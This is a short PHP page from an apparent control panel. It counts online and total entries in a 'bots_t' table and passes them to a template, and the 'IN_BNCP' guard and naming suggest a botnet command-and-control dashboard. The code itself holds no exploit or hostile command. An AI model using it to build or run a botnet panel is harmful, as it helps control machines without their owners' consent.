<?
	if (!defined('IN_BNCP')) exit;
	include_once ROOT_PATH."/mod/functs.php";	
	if( !$user->Check() ) exit;

	refresh_bot_info();

	$sql = 'SELECT COUNT(id_bot) FROM bots_t WHERE status_bot <> \'offline\'';
	$res =  $db->query($sql);
	$cnt = -1;
	if ((@($res)) && $db->affected_rows > 0) list($cnt) = $res->fetch_array();

	$sql = 'SELECT COUNT(id_bot) FROM bots_t';
	$res =  $db->query($sql);
	$cnt2 = -1;
	if ((@($res)) && $db->affected_rows > 0) list($cnt2) = $res->fetch_array();

	$smarty->assign('COUNT1', $cnt);
	$smarty->assign('COUNT2', $cnt2);
?>